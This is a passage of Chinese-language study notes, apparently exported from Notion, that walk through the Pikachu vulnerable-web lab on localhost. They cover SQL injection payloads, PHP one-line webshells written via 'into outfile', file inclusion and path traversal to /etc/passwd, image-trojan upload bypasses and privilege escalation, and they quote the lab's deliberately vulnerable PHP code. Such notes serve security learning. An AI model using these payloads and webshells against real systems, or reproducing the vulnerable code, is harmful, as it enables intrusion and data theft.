+}</code></pre></div><div style="display:contents" dir="ltr"><figure id="8068db55-6aee-8290-9b6e-815fef27ab40" class="image"><a href="WebWriteUp/Snipaste_2025-08-19_15-11-56.png"><img style="width:805.48828125px" src="WebWriteUp/Snipaste_2025-08-19_15-11-56.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="3b68db55-6aee-829e-bd26-8175087ddf40" class="toggle"><li><details open=""><summary>SQL（insert/update/delete）</summary><div style="display:contents" dir="auto"><p id="59e8db55-6aee-82fc-b553-01d7a05010ef" class="">insert/update</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" integrity="sha512-sijCOJblSCXYYmXdwvqV0tak8QJW5iy2yLB1wAbbLc3OOIueqymizRFWUS/mwKctnzPKpNdPJV3aK1zlDMJmXQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="7e58db55-6aee-83e2-8a3c-0171b33606be" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 利用or闭合，将database()换成想要的语句
+xiaoming&#x27; or updatexml(1, concat(0x7e, database()), 0) or &#x27; -- 最后的or &#x27; 用于闭合后面的&#x27;
+
+xiaoming&#x27; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&quot;pikachu&quot;)), 0) or &#x27;</code></pre></div><div style="display:contents" dir="auto"><p id="75c8db55-6aee-82bf-ab22-810384d51270" class="">delete</p></div><div style="display:contents" dir="auto"><pre id="fac8db55-6aee-8306-bed6-8144d6c2f79f" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">if(array_key_exists(&#x27;id&#x27;, $_GET)){
+    $query=&quot;delete from message where id={$_GET[&#x27;id&#x27;]}&quot;;
+    $result=execute($link, $query);
+    if(mysqli_affected_rows($link)==1){
+        header(&quot;location:sqli_del.php&quot;);
+    }else{
+        $html.=&quot;&lt;p style=&#x27;color: red&#x27;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&quot;;
+    }
+}</code></pre></div><div style="display:contents" dir="auto"><pre id="b138db55-6aee-8271-ac1b-01756ec9ea7a" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">1 or updatexml(1, concat(0x7e, database()), 0)</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="82a8db55-6aee-82d7-99f4-817ac4af875c" class="toggle"><li><details open=""><summary>SQL（Http Header）</summary><div style="display:contents" dir="auto"><p id="a3c8db55-6aee-82e3-94c4-8173defef86d" class="">有时候需要验证，修改，查询等http header内容（存在sql数据库查询，匹配等sql操作），但没有考虑到安全防范，或不规范导致</p></div><div style="display:contents" dir="auto"><pre id="4188db55-6aee-83b9-87d4-01a1b133c23b" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">Cookie: ant[uname]=admin&#x27; and updatexml(1, concat(0x7e, database()), 0)#
+
+fi&#x27; or updatexml(1, concat(0x7e, database()), 0) or &#x27;</code></pre></div><div style="display:contents" dir="ltr"><figure id="4078db55-6aee-82e8-9bd3-8129b9c261f5" class="image"><a href="WebWriteUp/Snipaste_2025-08-20_12-59-25.png"><img style="width:805.46875px" src="WebWriteUp/Snipaste_2025-08-20_12-59-25.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="a1a8db55-6aee-83f1-89a5-81e4fcae1cd0" class="image"><a href="WebWriteUp/Snipaste_2025-08-20_13-02-25.png"><img style="width:805.4752197265625px" src="WebWriteUp/Snipaste_2025-08-20_13-02-25.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="98b8db55-6aee-831b-930a-01cb9283f32c" class="image"><a href="WebWriteUp/Snipaste_2025-08-20_13-04-49.png"><img style="width:1012px" src="WebWriteUp/Snipaste_2025-08-20_13-04-49.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="aae8db55-6aee-837e-9d1b-81debb8b934f" class="toggle"><li><details open=""><summary>SQL（盲注）</summary><div style="display:contents" dir="auto"><p id="d3f8db55-6aee-8236-a985-81cebc17a48f" class="">后台处理了错误信息，输出的内容无用的报错信息</p></div><div style="display:contents" dir="auto"><p id="bd58db55-6aee-82fb-abba-81c8b1b02a7d" class="">1、真假盲注（boolean）</p></div><div style="display:contents" dir="auto"><p id="0fb8db55-6aee-8244-b574-013fad806031" class="">2、事件盲注（time）</p></div><div style="display:contents" dir="auto"><pre id="a0e8db55-6aee-83e5-be04-016e9f82a42e" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">kobe&#x27; and length(database()) &gt; 7#
+-- 判断database()名称的长度
+kobe&#x27; and ascii(substring(database(), 1, 1))=112#
+-- 逐位猜测database名称
+kobe&#x27; and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;112#
+-- 猜测表明字符串</code></pre></div><div style="display:contents" dir="auto"><pre id="f008db55-6aee-838b-8603-01d4f9335402" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">kobe&#x27; and if(substring(database(),1,1)=&#x27;a&#x27;, sleep(5), null)#
+# 猜解数据库名长度
+&#x27; and if(length(database()=8, sleep(5), 1)) -- -
+# 猜解数据库名首字符
+&#x27; and if(ascii(substring(database(),1,1))115, sleep(5), 1) -- # &#x27;s&#x27;=115</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7068db55-6aee-837b-b0c2-81ad0247f4bc" class="toggle"><li><details open=""><summary>一句话木马，远控</summary><div style="display:contents" dir="auto"><p id="9ad8db55-6aee-83a6-89f2-81f6827b2fa8" class="">一种短小精悍的木马客户端，隐蔽性好，功能强大</p></div><div style="display:contents" dir="auto"><p id="4ca8db55-6aee-82b6-a150-010aec52ff0e" class="">互联网上有很多变种，</p></div><div style="display:contents" dir="auto"><pre id="7898db55-6aee-82c0-8371-0123fed55d72" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">获取系统权限操作：
+kobe&#x27; union select &quot;&lt;?php @eval($_GET[&#x27;test&#x27;])?&gt;&quot;, 2 into outfile &quot;/var/www/html/1.php&quot;#
+kobe&#x27; union select &quot;&lt;?php system($_GET[&#x27;cmd&#x27;])?&gt;&quot;, 2 into outfile &quot;/var/www/html/2.php&quot;#</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7d88db55-6aee-83b9-a132-01a6bdce0021" class="toggle"><li><details open=""><summary>文件包含（本地/远程）</summary><div style="display:contents" dir="auto"><pre id="cf08db55-6aee-829f-a9a1-01a45035911e" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">发现是由前端操控读取后端的文件，
+http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=%E6%8F%90%E4%BA%A4
+因此可以控制读取文件的目录:
+http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4</code></pre></div><div style="display:contents" dir="auto"><pre id="0268db55-6aee-8268-9af9-01fa5bbd82bc" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$html=&#x27;&#x27;;
+if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;filename&#x27;]!=null){
+    $filename=$_GET[&#x27;filename&#x27;];
+    include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制
+//     //安全的写法,使用白名单，严格指定包含的文件名
+//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;){
+//         include &quot;include/$filename&quot;;
+
+//     }
+}</code></pre></div><div style="display:contents" dir="auto"><hr id="9238db55-6aee-82d1-b8bc-014f0673fe53"/></div><div style="display:contents" dir="auto"><p id="4af8db55-6aee-8254-a61a-01b9f465b1fd" class="">远程与本地差不多，攻击可以通过访问外部地址来加载远程代码</p></div><div style="display:contents" dir="auto"><p id="ec08db55-6aee-82d4-97ad-0118e2e06076" class="">远程包含漏洞前提：如果使用include和require，需要php.ini配置：</p></div><div style="display:contents" dir="auto"><p id="ff38db55-6aee-83a6-9c96-81507c439929" class=""><mark class="highlight-red">allow_url_fopen = on // 默认打开</mark></p></div><div style="display:contents" dir="auto"><p id="3a38db55-6aee-82e5-9fa7-015ae49d219c" class=""><mark class="highlight-red">Allow_url_include = on // 默认关闭</mark></p></div><div style="display:contents" dir="auto"><pre id="d968db55-6aee-82bd-90f9-810a1e3b694d" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all"># 正常路径
+http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&amp;submit=%E6%8F%90%E4%BA%A4
+# 替换为本地一句话木马文件位置
+http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/pikachu/test/yijuhua.txt&amp;submit=%E6%8F%90%E4%BA%A4</code></pre></div><div style="display:contents" dir="auto"><pre id="c0c8db55-6aee-8282-b375-81f040fc99c4" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置
+$html=&#x27;&#x27;;
+if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;filename&#x27;]!=null){
+    $filename=$_GET[&#x27;filename&#x27;];
+    include &quot;$filename&quot;;//变量传进来直接包含,没做任何的安全限制
+
+
+}</code></pre></div><div style="display:contents" dir="auto"><p id="aaf8db55-6aee-8229-8d08-01c781d765d3" class="">一句话木马：</p></div><div style="display:contents" dir="auto"><pre id="71d8db55-6aee-83b1-8e49-81e938016ce2" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+/**
+ * Created by runner.han
+ * There is nothing new under the sun
+ */
+
+$myfile = fopen(&quot;yijuhua.php&quot;,&quot;w&quot;);
+$txt = &#x27;&lt;?php system($_GET[x]);?&gt;&#x27;;
+fwrite($myfile,$txt);
+fclose($myfile);
+
+
+
+?&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="cb88db55-6aee-8257-8a46-01846dfb7936" class="toggle"><li><details open=""><summary>文件下载</summary><div style="display:contents" dir="auto"><p id="b738db55-6aee-8395-9527-8116d755a237" class="">很多网站提供下载功能，即用户可以通过点击下载链接，下载到链接所对应的文本。</p></div><div style="display:contents" dir="auto"><p id="e3b8db55-6aee-830c-a625-0154a7643e38" class="">但是，如果文件下载功能设计不当，则可能导致攻击者可以通过构造文件路径，从而获取到后台服务器上的其他敏感文件（任意文件下载）</p></div><div style="display:contents" dir="auto"><p id="cbf8db55-6aee-825e-bba9-019f72ea2df9" class="">比如../../../etc/passwd</p></div><div style="display:contents" dir="auto"><pre id="77c8db55-6aee-82c8-b6ed-013ab506899a" class="code code-wrap"><code class="language-css" style="white-space:pre-wrap;word-break:break-all">例如一个下载图片路径
+http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png
+构造，修改：
+../../../../../../../etc/passwd
+http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../etc/passwd</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="5308db55-6aee-8356-91f8-816da7d7faad" class="toggle"><li><details open=""><summary>文件上传</summary><div style="display:contents" dir="auto"><ul id="bde8db55-6aee-820f-8681-01ee839a72bd" class="toggle"><li><details open=""><summary>发现过滤在前端的情况</summary><div style="display:contents" dir="ltr"><figure id="69c8db55-6aee-8373-b678-819f0844b3ee" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-20-06.png"><img style="width:681.9951782226562px" src="WebWriteUp/Snipaste_2025-08-21_22-20-06.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="cce8db55-6aee-82b2-90eb-815599cfdccf" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-20-31.png"><img style="width:682.001220703125px" src="WebWriteUp/Snipaste_2025-08-21_22-20-31.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="6648db55-6aee-823f-875f-814f2b38f1db" class="">直接bp抓包，或者删除前端的onchange属性</p></div><div style="display:contents" dir="ltr"><figure id="b318db55-6aee-826a-8e03-01aadeb89a05" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-31-30.png"><img style="width:2136px" src="WebWriteUp/Snipaste_2025-08-21_22-31-30.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="dbd8db55-6aee-827e-94ee-810f84b0ef58" class="toggle"><li><details open=""><summary>MIME</summary><div style="display:contents" dir="auto"><p id="d4d8db55-6aee-83eb-904a-019e8ff6be24" class="">MIME：多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展文件名被访问的时候，浏览器会自动使用指定应用程序来打开，多用于指定一些客户端自定义问文件名，以及一些媒体打开方式。</p></div><div style="display:contents" dir="auto"><hr id="d5d8db55-6aee-82e8-b0f8-8106a1976a95"/></div><div style="display:contents" dir="auto"><p id="e698db55-6aee-8245-8b90-013582fac041" class="">每个MIME类型由两部分组成，前面是数据的大类别，例如生音audio，图像image等，后面定义具体类型。</p></div><div style="display:contents" dir="auto"><p id="7908db55-6aee-8238-aa30-01f2c2392835" class="">常见MIME类型：</p></div><div style="display:contents" dir="auto"><p id="aae8db55-6aee-82af-84c0-01097fd7a7c0" class="">超文本标记语言文本 .html/ .html text/html</p></div><div style="display:contents" dir="auto"><p id="c0a8db55-6aee-82ec-91bc-812aa4369c96" class="">普通文本 .txt text/plain</p></div><div style="display:contents" dir="auto"><p id="9548db55-6aee-8376-a964-81cad856af25" class="">RTF文本 .rtf application/rtf</p></div><div style="display:contents" dir="auto"><p id="8da8db55-6aee-833d-b71e-01e33ca64bb4" class="">GIF图形 .gif image/gif</p></div><div style="display:contents" dir="auto"><p id="3818db55-6aee-8218-b690-8157aa6e0ae4" class="">JPEG .ipeg .jpg image/jpeg</p></div><div style="display:contents" dir="auto"><hr id="7838db55-6aee-8370-ab40-01a69b09a369"/></div><div style="display:contents" dir="auto"><p id="5158db55-6aee-8296-91d1-81de88542ffb" class="">$_FILES() 可以从客户端计算机向远程服务器上传文件</p></div><div style="display:contents" dir="auto"><p id="5668db55-6aee-8247-8b0d-01976df4cf26" class="">第一个参数是表单的 input name</p></div><div style="display:contents" dir="auto"><p id="1648db55-6aee-82e0-883f-8183c9ceadff" class="">第二个可以是 name, type, size, tmp_name 或 error</p></div><div style="display:contents" dir="auto"><pre id="43a8db55-6aee-8251-8a01-01debf69b80b" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$_FILES[&#x27;file&#x27;][&#x27;name&#x27;] # 被上传文件的名称
+$_FILES[&#x27;file&#x27;][&#x27;type&#x27;] # 被上传文件的类型
+$_FILES[&#x27;file&#x27;][&#x27;size&#x27;] # 被上传文件的大小（字节）
+$_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;] # 存储在服务器的文件的临时副本名称
+$_FILES[&#x27;file&#x27;][&#x27;error&#x27;] # 由文件上传导致的错误代码</code></pre></div><div style="display:contents" dir="auto"><hr id="6ee8db55-6aee-83d2-ae6a-01513da1105a"/></div><div style="display:contents" dir="ltr"><figure id="7838db55-6aee-82c9-a9d9-013900a14f3c" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-51-41.png"><img style="width:681.9891967773438px" src="WebWriteUp/Snipaste_2025-08-21_22-51-41.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="0458db55-6aee-82c7-96e5-01783c3a69fa" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-52-09.png"><img style="width:681.9832153320312px" src="WebWriteUp/Snipaste_2025-08-21_22-52-09.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="8b48db55-6aee-8248-8185-01728b94a2f5" class="image"><a href="WebWriteUp/Snipaste_2025-08-21_22-53-40.png"><img style="width:682.001220703125px" src="WebWriteUp/Snipaste_2025-08-21_22-53-40.png"/></a></figure></div><div style="display:contents" dir="auto"><hr id="ac48db55-6aee-8288-b1ba-8111510f8266"/></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="9448db55-6aee-8312-81dc-01393380c6fa" class="toggle"><li><details open=""><summary>getimagesize</summary><div style="display:contents" dir="auto"><p id="4d48db55-6aee-82ea-8a51-81ed3893fc9d" class="">Getimagesize() 返回结果中有文件大小和文件类型，如果用这个函数来获取类型从而判断是否是图片的话，会存在问题。</p></div><div style="display:contents" dir="auto"><p id="a948db55-6aee-83e0-ab10-016a0292e234" class="">可以绕过，因为图片头可以伪造。</p></div><div style="display:contents" dir="auto"><p id="cf18db55-6aee-8380-8759-81c9cb89d77e" class=""><code>xxd aaa.png | head -n 1</code> xxd查看文件16进制，head -n 1指定看第一行。</p></div><div style="display:contents" dir="auto"><hr id="6488db55-6aee-834d-b76b-0172518df38d"/></div><div style="display:contents" dir="auto"><p id="7b68db55-6aee-8301-b2e0-019983d6a892" class="">图片木马制作：</p></div><div style="display:contents" dir="auto"><p id="7e08db55-6aee-8322-9bdc-81df0b8955c1" class="">方法1：直接伪造头部GIF89A</p></div><div style="display:contents" dir="auto"><p id="c248db55-6aee-8224-a531-01b2653df9f8" class="">方法2：CMD：<code>copy /b test.png + muma.php ccc.png</code></p></div><div style="display:contents" dir="auto"><p id="13c8db55-6aee-8242-8394-019406684a1b" class="">方法3：使用GIMP（开源图片修改软件），通过增加备注，写入命令行</p></div><div style="display:contents" dir="auto"><hr id="b968db55-6aee-83a8-b6e2-0129800b2587"/></div><div style="display:contents" dir="auto"><p id="5378db55-6aee-8208-9256-8189c10fc7d3" class="">上传后，重要的是执行包含在图片中的恶意代码，这时候，结合文件包含漏洞，让包含漏洞中的include()进行包含，</p></div><div style="display:contents" dir="auto"><p id="ad28db55-6aee-83e8-ab72-81cc45859ac1" class="">include()函数如果代码出错，会跳过出错的部分，往下执行，直到执行完毕，</p></div><div style="display:contents" dir="auto"><p id="86f8db55-6aee-8326-970c-81673f5fb3e2" class="">让其执行含有恶意代码的图片，会执行到恶意代码部分。</p></div><div style="display:contents" dir="auto"><pre id="17d8db55-6aee-83ec-9d2e-0192b2489d0f" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$html=&#x27;&#x27;;
+if(isset($_POST[&#x27;submit&#x27;])){
+    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型
+    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);
+    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹
+    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数
+    if($upload[&#x27;return&#x27;]){
+        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：{$upload[&#x27;save_path&#x27;]}&lt;/p&gt;&quot;;
+    }else{
+        $html.=&quot;&lt;p class=notice&gt;{$upload[&#x27;error&#x27;]}&lt;/p&gt;&quot;;
+
+    }
+}
+</code></pre></div></details></li></ul></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="0ec8db55-6aee-83b2-9578-813138e2456d" class="toggle"><li><details open=""><summary>越权</summary><div style="display:contents" dir="auto"><ul id="7298db55-6aee-8218-8d3e-01db29ba27bf" class="toggle"><li><details open=""><summary>平行</summary><div style="display:contents" dir="auto"><p id="65b8db55-6aee-829a-9518-01f839d6c64c" class="">漏洞源码</p></div><div style="display:contents" dir="auto"><pre id="f708db55-6aee-82ae-9cb0-81363e3f68c1" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$html=&#x27;&#x27;;
+if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;username&#x27;]!=null){
+    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
+    $username=escape($link, $_GET[&#x27;username&#x27;]);
+    $query=&quot;select * from member where username=&#x27;$username&#x27;&quot;;
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)==1){
+        $data=mysqli_fetch_assoc($result);
+        $uname=$data[&#x27;username&#x27;];
+        $sex=$data[&#x27;sex&#x27;];
+        $phonenum=$data[&#x27;phonenum&#x27;];
+        $add=$data[&#x27;address&#x27;];
+        $email=$data[&#x27;email&#x27;];</code></pre></div><div style="display:contents" dir="auto"><p id="7908db55-6aee-831c-9480-01f96e076999" class="">登录信息，方式get，直接传递username，改为其他用户的</p></div><div style="display:contents" dir="ltr"><figure id="afb8db55-6aee-82b4-a691-813df81184b6" class="image"><a href="WebWriteUp/Snipaste_2025-08-22_15-42-56.png"><img style="width:709.9819946289062px" src="WebWriteUp/Snipaste_2025-08-22_15-42-56.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="3668db55-6aee-83fa-8354-813237b76c58" class="image"><a href="WebWriteUp/Snipaste_2025-08-22_15-43-20.png"><img style="width:682.001220703125px" src="WebWriteUp/Snipaste_2025-08-22_15-43-20.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="16b8db55-6aee-82fc-a96f-01a309667602" class="toggle"><li><details open=""><summary>垂直</summary><div style="display:contents" dir="auto"><p id="ffc8db55-6aee-8392-80ab-010559aed9b2" class="">先登录到高权限用户登录，记录登录cookie，创建用户，或添加权限退出，再登录普通用户，拦截登录cookie，重放高权限用户操作，替换cookie。</p></div><div style="display:contents" dir="auto"><pre id="58a8db55-6aee-831b-b4e3-01d26ba70127" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$html=&quot;&quot;;
+if(isset($_POST[&#x27;submit&#x27;])){
+    if($_POST[&#x27;username&#x27;]!=null &amp;&amp; $_POST[&#x27;password&#x27;]!=null){
+        $username=escape($link, $_POST[&#x27;username&#x27;]);
+        $password=escape($link, $_POST[&#x27;password&#x27;]);//转义，防注入
+        $query=&quot;select * from users where username=&#x27;$username&#x27; and password=md5(&#x27;$password&#x27;)&quot;;
+        $result=execute($link, $query);
+        if(mysqli_num_rows($result)==1){
+            $data=mysqli_fetch_assoc($result);
+            if($data[&#x27;level&#x27;]==1){//如果级别是1，进入admin.php
+                $_SESSION[&#x27;op2&#x27;][&#x27;username&#x27;]=$username;
+                $_SESSION[&#x27;op2&#x27;][&#x27;password&#x27;]=sha1(md5($password));
+                $_SESSION[&#x27;op2&#x27;][&#x27;level&#x27;]=1;
+                header(&quot;location:op2_admin.php&quot;);
+            }
+            if($data[&#x27;level&#x27;]==2){//如果级别是2，进入user.php
+                $_SESSION[&#x27;op2&#x27;][&#x27;username&#x27;]=$username;
+                $_SESSION[&#x27;op2&#x27;][&#x27;password&#x27;]=sha1(md5($password));
+                $_SESSION[&#x27;op2&#x27;][&#x27;level&#x27;]=2;
+                header(&quot;location:op2_user.php&quot;);
+            }
+
+        }else{
+            //查询不到，登录失败
+            $html.=&quot;&lt;p&gt;登录失败,请重新登录&lt;/p&gt;&quot;;
+
+        }
+
+    }
+
+}</code></pre></div><div style="display:contents" dir="auto"><pre id="06c8db55-6aee-8321-838b-01b962c909ff" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">$link=connect();
+// 判断是否登录，没有登录不能访问
+//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。
+if(!check_op2_login($link)){
+    header(&quot;location:op2_login.php&quot;);
+    exit();
+}
+if(isset($_POST[&#x27;submit&#x27;])){
+    if($_POST[&#x27;username&#x27;]!=null &amp;&amp; $_POST[&#x27;password&#x27;]!=null){//用户名密码必填
+        $getdata=escape($link, $_POST);//转义
+        $query=&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;{$getdata[&#x27;username&#x27;]}&#x27;,md5(&#x27;{$getdata[&#x27;password&#x27;]}&#x27;),&#x27;{$getdata[&#x27;sex&#x27;]}&#x27;,&#x27;{$getdata[&#x27;phonenum&#x27;]}&#x27;,&#x27;{$getdata[&#x27;email&#x27;]}&#x27;,&#x27;{$getdata[&#x27;address&#x27;]}&#x27;)&quot;;
+        $result=execute($link, $query);
+        if(mysqli_affected_rows($link)==1){//判断是否插入
+            header(&quot;location:op2_admin.php&quot;);
+        }else {
+            $html.=&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;;
+
+        }
+    }
+}
+</code></pre></div></details></li></ul></div></details></li></ul></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="45f8db55-6aee-8354-b47c-818538d2f31b" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
